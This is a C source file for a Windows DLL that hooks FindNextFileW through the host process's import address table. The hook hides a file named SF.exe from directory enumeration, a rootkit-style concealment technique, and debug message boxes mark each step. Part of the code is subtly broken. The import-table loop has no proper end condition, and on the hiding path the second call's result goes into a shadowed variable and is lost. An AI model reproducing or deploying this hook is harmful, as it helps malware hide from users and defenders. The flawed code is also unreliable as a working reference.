#include <stdio.h>
#include <Windows.h>
#include "stdafx.h"

// DLL、Function
#define DEF_KERNEL		("api-ms-win-core-file-l1-1-0.dll")
#define DEF_FUNC		("FindNextFileW")
#define HIDDEN			L"SF.exe"

// original function syntax
typedef BOOL(WINAPI *tFindNextFileW)(
  HANDLE             hFindFile,
  LPWIN32_FIND_DATAW lpFindFileData
);

// save original function
tFindNextFileW savedFunc;

// fake function
BOOL WINAPI NewFindNextFileW(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
	// call origin function
	NTSTATUS status = ((tFindNextFileW)savedFunc)(hFindFile, lpFindFileData);

	// call again if find target
	if (!wcscmp(lpFindFileData->cFileName, HIDDEN)) {
		MessageBoxA(NULL, "Find Target", "Success", MB_OK);
		NTSTATUS status = ((tFindNextFileW)savedFunc)(hFindFile, lpFindFileData);
	}

	return status;
}

// IAT hook
DWORD WINAPI tryHook()
{
	HMODULE hMod = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
	PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)((ULONGLONG)hMod + (pDos->e_lfanew));
	PIMAGE_OPTIONAL_HEADER64 pOptional = &(pNt->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONGLONG)hMod + (pOptional->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress));
	DWORD dwOldProtect;
	PIMAGE_THUNK_DATA pThunk, rThunk;

	// find dll
	while (pImportDesc) {
		if (_stricmp(DEF_KERNEL, (PCHAR)(pImportDesc->Name + (ULONGLONG)hMod)) == 0)
			break;
		pImportDesc++;
	}

	MessageBoxA(NULL, (PCHAR)(pImportDesc->Name + (ULONGLONG)hMod), "Success", MB_OK);

	// find function
	pThunk = (PIMAGE_THUNK_DATA)(pImportDesc->FirstThunk + (ULONGLONG)hMod);
	rThunk = (PIMAGE_THUNK_DATA)(pImportDesc->OriginalFirstThunk + (UCHAR*)hMod);
	IMAGE_IMPORT_BY_NAME* pImportByName;
	while (pThunk->u1.Function) {
		pImportByName = (IMAGE_IMPORT_BY_NAME*)((char*)hMod + rThunk->u1.AddressOfData);
		if (_stricmp(pImportByName->Name, DEF_FUNC) == 0) {

			MessageBoxA(NULL, pImportByName->Name, "Success", MB_OK);

			// save original function
			savedFunc = (tFindNextFileW)pThunk->u1.Function;

			// change the protection
			VirtualProtect((LPVOID)&(pThunk->u1.Function), sizeof(LPVOID), PAGE_EXECUTE_READWRITE, &dwOldProtect);

			// point to fake function
			PROC* tmp = (PROC*)&(pThunk->u1.Function);
			*tmp = (PROC)&NewFindNextFileW;

			//  restore the protection
			VirtualProtect((LPVOID)&(pThunk->u1.Function), sizeof(LPVOID), dwOldProtect, &dwOldProtect);

			MessageBoxA(NULL, "VirtualProtect", "Success", MB_OK);

			return TRUE;
		}
		pThunk++; rThunk++;
	}

	MessageBoxA(NULL, "VirtualProtect", "Failed", MB_OK);

	return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		MessageBoxA(NULL, "ATTACH", "Success", MB_OK);
		tryHook();
		break;
	case DLL_PROCESS_DETACH:
		MessageBoxA(NULL, "DETACH", "Success", MB_OK);
		break;
	}
	return TRUE;
}